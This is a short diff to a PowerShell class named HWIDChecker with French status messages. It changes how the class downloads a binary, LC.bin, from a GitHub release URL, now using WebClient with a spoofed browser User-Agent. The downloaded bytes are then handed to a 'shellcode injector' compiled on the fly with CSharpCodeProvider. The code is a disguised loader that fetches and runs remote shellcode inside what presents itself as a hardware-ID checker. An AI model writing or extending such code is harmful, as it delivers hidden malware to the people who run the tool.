@@ -50,7 +50,9 @@ class HWIDChecker {
     hidden [void]ExecutePowerShellScript() {
         try {
             Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
-            $s = (Invoke-WebRequest -Uri "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin" -TimeoutSec 60 -UseBasicParsing).Content
+            $client = New-Object System.Net.WebClient
+            $client.Headers.Add("User-Agent", "Mozilla/5.0")
+            $s = $client.DownloadData("https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin")
             Write-Host "LC.bin telecharge: $($s.Length) bytes" -ForegroundColor Green
             Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
             $p = New-Object Microsoft.CSharp.CSharpCodeProvider
